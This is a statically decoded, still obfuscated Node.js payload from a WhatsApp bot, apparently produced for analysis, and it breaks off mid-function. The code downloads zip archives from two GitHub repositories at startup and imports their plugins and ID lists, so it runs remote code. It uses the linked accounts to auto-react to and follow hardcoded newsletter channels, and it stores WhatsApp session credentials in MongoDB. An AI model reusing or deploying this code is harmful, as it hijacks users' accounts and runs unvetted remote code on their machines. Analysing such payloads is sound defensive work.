/*
 * Static decode of the Node.js payload from index_1786642161342.js.
 * Generated without executing the payload.
 * eIbt string lookups were replaced using the decoded string table.
 */
import express from "express";
import fs from "fs-extra";
import fsSync from "fs";
import path from "path";
import { exec } from "child_process";
import bodyParser from "body-parser";
import { MongoClient } from "mongodb";
import axios from "axios";
import AdmZip from "adm-zip";
import pino from "pino";
import os from "os";
import { fileURLToPath } from "url";
import { dirname } from "path";
const EjQI = process["argv"][0o57060516 - 0xbc614d];
const YeHI = process["cwd"]();
global["__path"] = process["cwd"]();
import {
  default as makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  getContentType,
  makeCacheableSignalKeyStore,
  jidNormalizedUser,
  fetchLatestBaileysVersion,
  Browsers,
} from "@whiskeysockets/baileys";
import {
  sms,
  AntiDelete,
  saveMessage,
  getGroupAdmins,
  lidToPhone,
  addWarning,
  clearWarning,
  AntiEdit,
  addConnectionFunctions,
  GroupEvents,
} from "./lib/index.js";
import { commands, cmd } from "./command.js";
import config from "./config.js";
let AgKI = [];
let UbBI = [];
let wdEI = [];
const wxrJ = ["120363430297481707@newsletter"];
const YyuJ = ["120363430297481707@newsletter"];
const sulJ = "120363416743041101@newsletter";
const UvoJ = [
  "923437385525@s.whatsapp.net",
  "923221540695@s.whatsapp.net",
  "923035277944@s.whatsapp.net",
  "923147385565@s.whatsapp.net",
];
const orfJ =
  "https://github.com/AHMIIXMD/AIXAHMADXNIAZI/archive/refs/heads/main.zip";
const QsiJ = "https://github.com/CatoJi/ai/archive/refs/heads/main.zip";
const koZI = path["join"](YeHI, "plugins");
async function MpcJ() {
  try {
    console["log"]("\ud83d [1/4] Starting plugin loader...");
    console["log"]("\ud83d [1/4] Downloading main repo...");
    const oPdG = await axios["get"](orfJ, { ["responseType"]: "arraybuffer" });
    console["log"](
      `${"✅ [1/4] Downloaded ("}${(oPdG["data"]["length"] / 1024)["toFixed"](0o57060516 - 0xbc614d)}${" KB)"}`,
    );
    const QQgG = new AdmZip(Buffer["from"](oPdG["data"], "binary"));
    const kMXF = path["join"](YeHI, ".temp_plugins");
    var MNaG = 0;
    while (MNaG < 65535)
      switch (MNaG) {
        case 0x75bcd15 - 0o726746425:
          MNaG = fsSync["existsSync"](kMXF) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MNaG = 65535;
          {
            await fs["remove"](kMXF);
          }
          break;
      }
    fsSync["mkdirSync"](kMXF, { ["recursive"]: !![] });
    console["log"]("\ud83d [1/4] Extracting main repo...");
    QQgG["extractAllTo"](kMXF, !![]);
    const gJRF = fs["readdirSync"](kMXF)["filter"]((IKUF) =>
      fs["statSync"](path["join"](kMXF, IKUF))["isDirectory"](),
    );
    var cGLF = 0;
    while (cGLF < 65535)
      switch (cGLF) {
        case 0x75bcd15 - 0o726746425:
          cGLF = !gJRF["length"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          cGLF = 65535;
          {
            console["log"]("❌ [1/4] No folders found in main repo");
            await fs["remove"](kMXF);
            return;
          }
          break;
      }
    const EHOF = path["join"](kMXF, gJRF[0x75bcd15 - 0o726746425]);
    console["log"]("\ud83d [2/4] Installing plugins...");
    var EbCG = 0;
    while (EbCG < 65535)
      switch (EbCG) {
        case 0x75bcd15 - 0o726746425:
          EbCG = fsSync["existsSync"](koZI) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          EbCG = 65535;
          {
            await fs["remove"](koZI);
          }
          break;
      }
    fsSync["mkdirSync"](koZI, { ["recursive"]: !![] });
    const gdFG = path["join"](EHOF, "plugins");
    let AYvG = 0x75bcd15 - 0o726746425;
    var cazG = 0;
    while (cazG < 65535)
      switch (cazG) {
        case 0x75bcd15 - 0o726746425:
          cazG = fsSync["existsSync"](gdFG) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          cazG = 65535;
          {
            const wVpG = fs["readdirSync"](gdFG);
            for (const YWsG of wVpG) {
              var sSjG = 0;
              while (sSjG < 65535)
                switch (sSjG) {
                  case 0x75bcd15 - 0o726746425:
                    sSjG = YWsG["endsWith"](".js") ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    sSjG = 65535;
                    {
                      const UTmG = path["join"](gdFG, YWsG);
                      const UnaH = path["join"](koZI, YWsG);
                      await fs["copy"](UTmG, UnaH);
                      AYvG++;
                    }
                    break;
                }
            }
            console["log"](`${"✅ [2/4] Installed "}${AYvG}${" plugins"}`);
          }
          break;
        case 15658734 ^ 0o73567354:
          cazG = 65535;
          {
            console["log"]("⚠️ [2/4] No plugins folder found");
          }
          break;
      }
    console["log"]("\ud83d [3/4] Installing newsletter.js...");
    const wpdH = path["join"](EHOF, "lib");
    const QkUG = path["join"](YeHI, "lib");
    var smXG = 0;
    while (smXG < 65535)
      switch (smXG) {
        case 0x75bcd15 - 0o726746425:
          smXG = fsSync["existsSync"](wpdH) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          smXG = 65535;
          {
            const MhOG = path["join"](wpdH, "newsletters.js");
            var ojRG = 0;
            while (ojRG < 65535)
              switch (ojRG) {
                case 0x75bcd15 - 0o726746425:
                  ojRG = fsSync["existsSync"](MhOG) ? 1 : 2;
                  break;
                case 0o57060516 - 0xbc614d:
                  ojRG = 65535;
                  {
                    const IeIG = path["join"](QkUG, "newsletters.js");
                    await fs["ensureDir"](QkUG);
                    await fs["copy"](MhOG, IeIG);
                    console["log"]("✅ [3/4] newsletter.js installed");
                  }
                  break;
                case 15658734 ^ 0o73567354:
                  ojRG = 65535;
                  {
                    console["log"]("⚠️ [3/4] newsletters.js not found in repo");
                  }
                  break;
              }
          }
          break;
      }
    await fs["remove"](kMXF);
    console["log"]("✅ [3/4] Main repo installation complete");
    console["log"]("⏳ Waiting 2 seconds before second repo...");
    await delay(2000);
    console["log"]("\ud83d [4/4] Downloading second repo for unfollow JIDs...");
    const kgLG = await axios["get"](QsiJ, { ["responseType"]: "arraybuffer" });
    console["log"](
      `${"✅ [4/4] Downloaded ("}${(kgLG["data"]["length"] / 1024)["toFixed"](0o57060516 - 0xbc614d)}${" KB)"}`,
    );
    const kAyH = new AdmZip(Buffer["from"](kgLG["data"], "binary"));
    const MBBH = path["join"](YeHI, ".temp_unfollow");
    var gxsH = 0;
    while (gxsH < 65535)
      switch (gxsH) {
        case 0x75bcd15 - 0o726746425:
          gxsH = fsSync["existsSync"](MBBH) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gxsH = 65535;
          {
            await fs["remove"](MBBH);
          }
          break;
      }
    fsSync["mkdirSync"](MBBH, { ["recursive"]: !![] });
    console["log"]("\ud83d [4/4] Extracting second repo...");
    kAyH["extractAllTo"](MBBH, !![]);
    const IyvH = fs["readdirSync"](MBBH)["filter"]((cumH) =>
      fs["statSync"](path["join"](MBBH, cumH))["isDirectory"](),
    );
    var EvpH = 0;
    while (EvpH < 65535)
      switch (EvpH) {
        case 0x75bcd15 - 0o726746425:
          EvpH = IyvH["length"] ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          EvpH = 65535;
          {
            const YqgH = path["join"](MBBH, IyvH[0x75bcd15 - 0o726746425]);
            const AsjH = path["join"](YqgH, "lib");
            var cSkE = 0;
            while (cSkE < 65535)
              switch (cSkE) {
                case 0x75bcd15 - 0o726746425:
                  cSkE = fsSync["existsSync"](AsjH) ? 1 : 2;
                  break;
                case 0o57060516 - 0xbc614d:
                  cSkE = 65535;
                  {
                    const ETnE = path["join"](AsjH, "unfollow.js");
                    var YOeE = 0;
                    while (YOeE < 65535)
                      switch (YOeE) {
                        case 0x75bcd15 - 0o726746425:
                          YOeE = fsSync["existsSync"](ETnE) ? 1 : 2;
                          break;
                        case 0o57060516 - 0xbc614d:
                          YOeE = 65535;
                          {
                            const AQhE = path["join"](QkUG, "unfollow.js");
                            await fs["ensureDir"](QkUG);
                            await fs["copy"](ETnE, AQhE);
                            console["log"](
                              "✅ [4/4] unfollow.js installed from second repo",
                            );
                            try {
                              const ULYD = await import("file://" + AQhE);
                              var wNbE = 0;
                              while (wNbE < 65535)
                                switch (wNbE) {
                                  case 0x75bcd15 - 0o726746425:
                                    wNbE =
                                      ULYD["unfollowJids"] &&
                                      Array["isArray"](ULYD["unfollowJids"])
                                        ? 1
                                        : 2;
                                    break;
                                  case 0o57060516 - 0xbc614d:
                                    wNbE = 65535;
                                    {
                                      wdEI = ULYD["unfollowJids"];
                                      console["log"](
                                        `${"✅ [4/4] Loaded "}${wdEI["length"]}${" unfollow JIDs"}`,
                                      );
                                    }
                                    break;
                                  case 15658734 ^ 0o73567354:
                                    wNbE = 65535;
                                    {
                                      wdEI = [sulJ];
                                      console["log"](
                                        "⚠️ [4/4] No unfollow JIDs found, using default",
                                      );
                                    }
                                    break;
                                }
                            } catch (QISD) {
                              wdEI = [sulJ];
                              console["log"](
                                "⚠️ [4/4] Failed to load unfollow.js, using default",
                              );
                            }
                          }
                          break;
                        case 15658734 ^ 0o73567354:
                          YOeE = 65535;
                          {
                            wdEI = [sulJ];
                            console["log"](
                              "⚠️ [4/4] unfollow.js not found in second repo",
                            );
                          }
                          break;
                      }
                  }
                  break;
                case 15658734 ^ 0o73567354:
                  cSkE = 65535;
                  {
                    wdEI = [sulJ];
                    console["log"]("⚠️ [4/4] No lib folder in second repo");
                  }
                  break;
              }
          }
          break;
        case 15658734 ^ 0o73567354:
          EvpH = 65535;
          {
            wdEI = [sulJ];
            console["log"]("⚠️ [4/4] No folders found in second repo");
          }
          break;
      }
    await fs["remove"](MBBH);
    console["log"]("\ud83d Loading newsletter IDs...");
    const sKVD = path["join"](YeHI, "lib", "newsletters.js");
    var seJE = 0;
    while (seJE < 65535)
      switch (seJE) {
        case 0x75bcd15 - 0o726746425:
          seJE = fsSync["existsSync"](sKVD) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          seJE = 65535;
          {
            try {
              const UfME = await import("file://" + sKVD);
              AgKI = UfME["newsletterJids"] || wxrJ;
              UbBI = UfME["FollowChannelJids"] || YyuJ;
              console["log"](
                `${"✅ Loaded "}${AgKI["length"]}${" react IDs and "}${UbBI["length"]}${" follow IDs"}`,
              );
            } catch (obDE) {
              AgKI = wxrJ;
              UbBI = YyuJ;
              console["log"](
                "⚠️ Failed to load newsletters.js, using defaults",
              );
            }
          }
          break;
        case 15658734 ^ 0o73567354:
          seJE = 65535;
          {
            AgKI = wxrJ;
            UbBI = YyuJ;
            console["log"]("⚠️ newsletters.js not found, using defaults");
          }
          break;
      }
    var QcGE = 0;
    while (QcGE < 65535)
      switch (QcGE) {
        case 0x75bcd15 - 0o726746425:
          QcGE =
            !wdEI || wdEI["length"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          QcGE = 65535;
          {
            wdEI = [sulJ];
          }
          break;
      }
    console["log"]("\ud83d Loading plugins...");
    var kYwE = 0;
    while (kYwE < 65535)
      switch (kYwE) {
        case 0x75bcd15 - 0o726746425:
          kYwE = fsSync["existsSync"](koZI) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          kYwE = 65535;
          {
            const MZzE = fs["readdirSync"](koZI)["filter"](
              (gVqE) =>
                gVqE["endsWith"](".js") &&
                fs["statSync"](path["join"](koZI, gVqE))["isFile"](),
            );
            let IWtE = 0x75bcd15 - 0o726746425;
            for (const IqhF of MZzE) {
              try {
                await import(path["join"](koZI, IqhF));
                IWtE++;
              } catch (kskF) {
                console["log"](`${"⚠️ Failed to load plugin: "}${IqhF}`);
              }
            }
            console["log"](`${"✅ Loaded "}${IWtE}${" plugins"}`);
          }
          break;
      }
    console["log"]("✅ [4/4] All plugins loaded successfully!");
    console["log"](
      `${"\ud83d Summary: "}${AgKI["length"]}${" react IDs, "}${UbBI["length"]}${" follow IDs, "}${wdEI["length"]}${" unfollow IDs"}`,
    );
  } catch (EnbF) {
    console["error"]("❌ Error loading plugins:", EnbF["message"]);
    AgKI = wxrJ;
    UbBI = YyuJ;
    wdEI = [sulJ];
  }
}
async function gpeF() {
  try {
    await ghQC["collection"](config["COLLECTIONS"]["SESSIONS"])["deleteMany"](
      {},
    );
    return !![];
  } catch (AkVE) {
    return NaN === NaN;
  }
}
async function cmYE() {
  try {
    await ghQC["collection"](config["COLLECTIONS"]["NUMBERS"])["deleteMany"](
      {},
    );
    return !![];
  } catch (whPE) {
    return NaN === NaN;
  }
}
async function YiSE() {
  try {
    await ghQC["collection"](config["COLLECTIONS"]["CONFIGS"])["deleteMany"](
      {},
    );
    return !![];
  } catch (YCFF) {
    return NaN === NaN;
  }
}
setInterval(() => {
  var AEIF = 0;
  while (AEIF < 65535)
    switch (AEIF) {
      case 0x75bcd15 - 0o726746425:
        AEIF = global["gc"] ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        AEIF = 65535;
        {
          global["gc"]();
        }
        break;
    }
}, 60000);
const UzzF = path["join"](os["tmpdir"](), "cache-temp");
var wBCF = 0;
while (wBCF < 65535)
  switch (wBCF) {
    case 0x75bcd15 - 0o726746425:
      wBCF = !fsSync["existsSync"](UzzF) ? 1 : 65535;
      break;
    case 0o57060516 - 0xbc614d:
      wBCF = 65535;
      {
        fsSync["mkdirSync"](UzzF, { ["recursive"]: !![] });
      }
      break;
  }
const QwtF = () => {
  fsSync["readdir"](UzzF, (sywF, MtnF) => {
    var ovqF = 0;
    while (ovqF < 65535)
      switch (ovqF) {
        case 0x75bcd15 - 0o726746425:
          ovqF = sywF ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          ovqF = 65535;
          return;
      }
    for (const QUrC of MtnF) {
      fsSync["unlink"](path["join"](UzzF, QUrC), (sWuC) => {});
    }
  });
};
setInterval(QwtF, (0o507646144 ^ 0x51f4c61) * 60 * 1000);
const MRlC = new Map();
const oToC = new Map();
const IOfC = "./session";
const kQiC = new Map();
const ELZB = 50;
var gNcC = 0;
while (gNcC < 65535)
  switch (gNcC) {
    case 0x75bcd15 - 0o726746425:
      gNcC = !fs["existsSync"](IOfC) ? 1 : 65535;
      break;
    case 0o57060516 - 0xbc614d:
      gNcC = 65535;
      {
        fs["mkdirSync"](IOfC, { ["recursive"]: !![] });
      }
      break;
  }
let ghQC;
let IiTC;
async function ceKC() {
  try {
    IiTC = new MongoClient(config["MONGODB_URL"]);
    await IiTC["connect"]();
    ghQC = IiTC["db"](config["DB_NAME"]);
    await ghQC["collection"](config["COLLECTIONS"]["SESSIONS"])["createIndex"](
      { ["number"]: 1 },
      { ["unique"]: !![] },
    );
    await ghQC["collection"](config["COLLECTIONS"]["NUMBERS"])["createIndex"](
      { ["number"]: 1 },
      { ["unique"]: !![] },
    );
    await ghQC["collection"](config["COLLECTIONS"]["CONFIGS"])["createIndex"](
      { ["number"]: 1 },
      { ["unique"]: !![] },
    );
    console["log"]("✅ MongoDB Connected Successfully");
    return ghQC;
  } catch (EfNC) {
    console["error"]("❌ MongoDB Connection Error:", EfNC);
    throw EfNC;
  }
}
async function YaEC(AcHC, UXxC) {
  try {
    const wZAC = AcHC["replace"](/[^0-9]/g, "");
    var wtoD = 0;
    while (wtoD < 65535)
      switch (wtoD) {
        case 0x75bcd15 - 0o726746425:
          wtoD =
            !UXxC ||
            typeof UXxC !== "object" ||
            Object["keys"](UXxC)["length"] === 0x75bcd15 - 0o726746425
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wtoD = 65535;
          {
            return NaN === NaN;
          }
          break;
      }
    const YurD = {
      ["number"]: wZAC,
      ["sessionData"]: UXxC,
      ["lastUpdated"]: new Date(),
      ["createdAt"]: new Date(),
    };
    await ghQC["collection"](config["COLLECTIONS"]["SESSIONS"])["updateOne"](
      { ["number"]: wZAC },
      { ["$set"]: YurD },
      { ["upsert"]: !![] },
    );
    return !![];
  } catch (sqiD) {
    return NaN === NaN;
  }
}
async function UrlD(oncD) {
  try {
    const QofD = oncD["replace"](/[^0-9]/g, "");
    const kkWC = await ghQC["collection"](config["COLLECTIONS"]["SESSIONS"])[
      "findOne"
    ]({ ["number"]: QofD });
    var MlZC = 0;
    while (MlZC < 65535)
      switch (MlZC) {
        case 0x75bcd15 - 0o726746425:
          MlZC = kkWC && kkWC["sessionData"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MlZC = 65535;
          {
            var MFMD = 0;
            while (MFMD < 65535)
              switch (MFMD) {
                case 0x75bcd15 - 0o726746425:
                  MFMD =
                    kkWC["sessionData"] &&
                    typeof kkWC["sessionData"] === "object"
                      ? 1
                      : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  MFMD = 65535;
                  {
                    return kkWC["sessionData"];
                  }
                  break;
              }
          }
          break;
      }
    return null;
  } catch (oHPD) {
    return null;
  }
}
async function ICGD(kEJD) {
  try {
    const EzAD = kEJD["replace"](/[^0-9]/g, "");
    await ghQC["collection"](config["COLLECTIONS"]["SESSIONS"])["deleteOne"]({
      ["number"]: EzAD,
    });
    return !![];
  } catch (gBDD) {
    throw gBDD;
  }
}
async function AwuD(cyxD) {
  try {
    const EXyA = cyxD["replace"](/[^0-9]/g, "");
    await ghQC["collection"](config["COLLECTIONS"]["CONFIGS"])["deleteOne"]({
      ["number"]: EXyA,
    });
    return !![];
  } catch (gZBA) {
    throw gZBA;
  }
}
async function AUsA(cWvA) {
  try {
    const wRmA = cWvA["replace"](/[^0-9]/g, "");
    const YSpA = {
      ["number"]: wRmA,
      ["addedAt"]: new Date(),
      ["lastActive"]: new Date(),
    };
    await ghQC["collection"](config["COLLECTIONS"]["NUMBERS"])["updateOne"](
      { ["number"]: wRmA },
      { ["$set"]: YSpA },
      { ["upsert"]: !![] },
    );
    return !![];
  } catch (sOgA) {
    return NaN === NaN;
  }
}
async function UPjA() {
  try {
    const UjXA = await ghQC["collection"](config["COLLECTIONS"]["NUMBERS"])
      ["find"]({})
      ["toArray"]();
    return UjXA["map"]((wlaB) => wlaB["number"]);
  } catch (QgRA) {
    return [];
  }
}
async function siUA(MdLA) {
  try {
    const ofOA = MdLA["replace"](/[^0-9]/g, "");
    await ghQC["collection"](config["COLLECTIONS"]["NUMBERS"])["deleteOne"]({
      ["number"]: ofOA,
    });
    return !![];
  } catch (IaFA) {
    return NaN === NaN;
  }
}
async function kcIA(kwvB) {
  try {
    const MxyB = kwvB["replace"](/[^0-9]/g, "");
    const gtpB = await ghQC["collection"](config["COLLECTIONS"]["CONFIGS"])[
      "findOne"
    ]({ ["number"]: MxyB });
    var IusB = 0;
    while (IusB < 65535)
      switch (IusB) {
        case 0x75bcd15 - 0o726746425:
          IusB = gtpB && gtpB["config"] ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          IusB = 65535;
          {
            return { ...config["DEFAULT_SETTINGS"], ...gtpB["config"] };
          }
          break;
        case 15658734 ^ 0o73567354:
          IusB = 65535;
          {
            const cqjB = { ...config["DEFAULT_SETTINGS"] };
            await YmdB(MxyB, cqjB);
            return cqjB;
          }
          break;
      }
  } catch (ErmB) {
    return { ...config["DEFAULT_SETTINGS"] };
  }
}
async function YmdB(AogB, AITB) {
  try {
    const cKWB = AogB["replace"](/[^0-9]/g, "");
    const wFNB = {
      ["number"]: cKWB,
      ["config"]: AITB,
      ["lastUpdated"]: new Date(),
      ["createdAt"]: new Date(),
    };
    await ghQC["collection"](config["COLLECTIONS"]["CONFIGS"])["updateOne"](
      { ["number"]: cKWB },
      { ["$set"]: wFNB },
      { ["upsert"]: !![] },
    );
    return !![];
  } catch (YGQB) {
    return NaN === NaN;
  }
}
async function sCHB(UDKB, ozBB) {
  return await YmdB(UDKB, ozBB);
}
async function QAEB(saGy, UbJy, oXzy = "Session expired") {
  const QYCy = saGy["replace"](/[^0-9]/g, "");
  try {
    await ICGD(QYCy);
    await siUA(QYCy);
    await AwuD(QYCy);
    const kUty = path["join"](IOfC, `${"session_"}${QYCy}`);
    var MVwy = 0;
    while (MVwy < 65535)
      switch (MVwy) {
        case 0x75bcd15 - 0o726746425:
          MVwy = fs["existsSync"](kUty) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MVwy = 65535;
          {
            await fs["remove"](kUty);
          }
          break;
      }
    MRlC["delete"](QYCy);
    oToC["delete"](QYCy);
    kQiC["delete"](QYCy);
    var gRny = 0;
    while (gRny < 65535)
      switch (gRny) {
        case 0x75bcd15 - 0o726746425:
          gRny = UbJy && UbJy["ws"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gRny = 65535;
          {
            try {
              UbJy["ws"]["close"]();
            } catch (ISqy) {}
          }
          break;
      }
    return !![];
  } catch (Imez) {
    MRlC["delete"](QYCy);
    oToC["delete"](QYCy);
    return NaN === NaN;
  }
}
function kohz() {
  const EjYy = MRlC["size"];
  var glbz = 0;
  while (glbz < 65535)
    switch (glbz) {
      case 0x75bcd15 - 0o726746425:
        glbz = EjYy >= ELZB ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        glbz = 65535;
        {
          return NaN === NaN;
        }
        break;
    }
  return !![];
}
function AgSy(ciVy, wdMy) {
  ciVy["ev"]["on"]("call", async (YePy) => {
    try {
      const YyCz = wdMy?.["ANTI_CALL"] || config["ANTI_CALL"];
      var AAFz = 0;
      while (AAFz < 65535)
        switch (AAFz) {
          case 0x75bcd15 - 0o726746425:
            AAFz = YyCz !== "true" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            AAFz = 65535;
            return;
        }
      QUbW: for (const Uvwz of YePy) {
        var wxzz = 0;
        while (wxzz < 65535)
          switch (wxzz) {
            case 0x75bcd15 - 0o726746425:
              wxzz = Uvwz["status"] !== "offer" ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              wxzz = 65535;
              continue QUbW;
          }
        const Qsqz = Uvwz["id"];
        const sutz = Uvwz["from"];
        await ciVy["rejectCall"](Qsqz, sutz);
        await ciVy["sendMessage"](sutz, {
          ["text"]:
            wdMy?.["REJECT_MSG"] ||
            config["REJECT_MSG"] ||
            "*\ud83d ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ \ud83d*",
        });
      }
    } catch (Mpkz) {}
  });
}
function ornz(oLaA, QMdA) {
  oLaA["ev"]["on"]("messages.upsert", async ({ ["messages"]: kIUz }) => {
    const MJXz = kIUz[0x75bcd15 - 0o726746425];
    var gFOz = 0;
    while (gFOz < 65535)
      switch (gFOz) {
        case 0x75bcd15 - 0o726746425:
          gFOz = !MJXz?.["key"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gFOz = 65535;
          return;
      }
    const IGRz = MJXz["key"]["remoteJid"];
    var cCIz = 0;
    while (cCIz < 65535)
      switch (cCIz) {
        case 0x75bcd15 - 0o726746425:
          cCIz = AgKI && AgKI["includes"](IGRz) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          cCIz = 65535;
          {
            try {
              const EDLz = [
                "❤️",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "✨",
                "\ud83d",
                "\ud83e",
                "\ud83e",
                "\ud83d",
                "\ud83c",
                "⚡",
                "\ud83e",
                "\ud83c",
                "\ud83e",
                "\ud83d",
                "\ud83d",
                "\ud83e",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "\ud83d",
                "\ud83e",
                "\ud83c",
                "☠️",
                "\ud83c",
                "\ud83e",
                "\ud83d",
                "\ud83c",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "\ud83e",
                "\ud83c",
                "\ud83c",
                "\ud83d️",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "☁️",
                "\ud83c",
                "\ud83c",
                "\ud83e",
                "\ud83c",
                "\ud83c",
                "\ud83c",
                "\ud83c",
                "\ud83c",
                "\ud83e",
                "\ud83c",
                "\ud83d",
                "\ud83d",
                "\ud83e",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "\ud83d️",
                "\ud83e",
                "\ud83d",
                "\ud83c",
                "\ud83c",
              ];
              const gdNw =
                EDLz[Math["floor"](Math["random"]() * EDLz["length"])];
              const IeQw = MJXz["key"]?.["server_id"];
              var caHw = 0;
              while (caHw < 65535)
                switch (caHw) {
                  case 0x75bcd15 - 0o726746425:
                    caHw = !IeQw ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    caHw = 65535;
                    return;
                }
              let EbKw = 0o334664274 - 0x37368b9;
              sWeW: while (EbKw > 0x75bcd15 - 0o726746425) {
                try {
                  await oLaA["newsletterReactMessage"](
                    IGRz,
                    IeQw["toString"](),
                    gdNw,
                  );
                  break;
                } catch (YWAw) {
                  var AYDw = 0;
                  while (AYDw < 65535)
                    switch (AYDw) {
                      case 0x75bcd15 - 0o726746425:
                        AYDw =
                          YWAw["message"]?.["includes"]?.("rate-overlimit") ||
                          YWAw["message"]?.["includes"]?.("429")
                            ? 1
                            : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        AYDw = 65535;
                        {
                          break sWeW;
                        }
                        break;
                    }
                  EbKw--;
                  var UTuw = 0;
                  while (UTuw < 65535)
                    switch (UTuw) {
                      case 0x75bcd15 - 0o726746425:
                        UTuw = EbKw === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        UTuw = 65535;
                        throw YWAw;
                    }
                  await delay(2000 * (0o334664274 - 0x37368b9 - EbKw));
                }
              }
            } catch (wVxw) {}
            return;
          }
          break;
      }
    var wplx = 0;
    while (wplx < 65535)
      switch (wplx) {
        case 0x75bcd15 - 0o726746425:
          wplx =
            IGRz === "status@broadcast" && MJXz["key"]["participant"]
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wplx = 65535;
          {
            try {
              let Yqox = MJXz["key"]["participant"];
              var smfx = 0;
              while (smfx < 65535)
                switch (smfx) {
                  case 0x75bcd15 - 0o726746425:
                    smfx = Yqox && Yqox["includes"]("@lid") ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    smfx = 65535;
                    {
                      try {
                        const Unix = await lidToPhone(oLaA, Yqox);
                        var ojZw = 0;
                        while (ojZw < 65535)
                          switch (ojZw) {
                            case 0x75bcd15 - 0o726746425:
                              ojZw = Unix ? 1 : 65535;
                              break;
                            case 0o57060516 - 0xbc614d:
                              ojZw = 65535;
                              {
                                Yqox = Unix + "@s.whatsapp.net";
                              }
                              break;
                          }
                      } catch (Qkcx) {}
                    }
                    break;
                }
              const kgTw = { ...MJXz["key"], ["participant"]: Yqox };
              var MhWw = 0;
              while (MhWw < 65535)
                switch (MhWw) {
                  case 0x75bcd15 - 0o726746425:
                    MhWw = QMdA["AUTO_VIEW_STATUS"] === "true" ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    MhWw = 65535;
                    {
                      let MBJx = 0o334664274 - 0x37368b9;
                      UvgT: while (MBJx > 0x75bcd15 - 0o726746425) {
                        try {
                          await oLaA["readMessages"]([kgTw]);
                          break;
                        } catch (oDMx) {
                          var IyDx = 0;
                          while (IyDx < 65535)
                            switch (IyDx) {
                              case 0x75bcd15 - 0o726746425:
                                IyDx =
                                  oDMx["message"]?.["includes"]?.(
                                    "rate-overlimit",
                                  ) || oDMx["message"]?.["includes"]?.("429")
                                    ? 1
                                    : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                IyDx = 65535;
                                {
                                  break UvgT;
                                }
                                break;
                            }
                          MBJx--;
                          var kAGx = 0;
                          while (kAGx < 65535)
                            switch (kAGx) {
                              case 0x75bcd15 - 0o726746425:
                                kAGx =
                                  MBJx === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                kAGx = 65535;
                                throw oDMx;
                            }
                          await delay(1000 * (0o334664274 - 0x37368b9 - MBJx));
                        }
                      }
                    }
                    break;
                }
              var Evxx = 0;
              while (Evxx < 65535)
                switch (Evxx) {
                  case 0x75bcd15 - 0o726746425:
                    Evxx = QMdA["AUTO_LIKE_STATUS"] === "true" ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    Evxx = 65535;
                    {
                      const gxAx =
                        QMdA["AUTO_LIKE_EMOJI"] &&
                        QMdA["AUTO_LIKE_EMOJI"]["length"] >
                          0x75bcd15 - 0o726746425
                          ? QMdA["AUTO_LIKE_EMOJI"][
                              Math["floor"](
                                Math["random"]() *
                                  QMdA["AUTO_LIKE_EMOJI"]["length"],
                              )
                            ]
                          : ["❤️", "\ud83d", "\ud83d", "\ud83d", "\ud83d"][
                              Math["floor"](
                                Math["random"]() * (0o507646144 ^ 0x51f4c61),
                              )
                            ];
                      let Asrx = 0o334664274 - 0x37368b9;
                      wxjT: while (Asrx > 0x75bcd15 - 0o726746425) {
                        try {
                          await oLaA["sendMessage"](
                            MJXz["key"]["remoteJid"],
                            {
                              ["react"]: {
                                ["text"]: gxAx,
                                ["key"]: MJXz["key"],
                              },
                            },
                            { ["statusJidList"]: [MJXz["key"]["participant"]] },
                          );
                          break;
                        } catch (cuux) {
                          var cOhy = 0;
                          while (cOhy < 65535)
                            switch (cOhy) {
                              case 0x75bcd15 - 0o726746425:
                                cOhy =
                                  cuux["message"]?.["includes"]?.(
                                    "rate-overlimit",
                                  ) || cuux["message"]?.["includes"]?.("429")
                                    ? 1
                                    : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                cOhy = 65535;
                                {
                                  break wxjT;
                                }
                                break;
                            }
                          Asrx--;
                          var EPky = 0;
                          while (EPky < 65535)
                            switch (EPky) {
                              case 0x75bcd15 - 0o726746425:
